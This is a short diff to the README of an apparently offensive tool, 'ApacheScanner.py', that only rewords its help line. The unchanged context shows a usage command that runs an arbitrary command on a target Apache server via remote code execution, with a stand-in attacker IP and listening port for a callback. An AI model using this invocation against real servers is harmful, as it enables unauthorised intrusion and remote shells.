@@ -8,4 +8,4 @@ To run this Script install the Required pip Modules and define your command by t
 
 ```python3 ApacheScanner.py -u http://serveriphere  --rce --cmd "your command here" --lhost <your attacker IP> --lport <Your listening port>``` 
 
-```python3 ApacheScanner.py --h```  for help and see all commands
+```python3 ApacheScanner.py --h```  for help and to see all commands
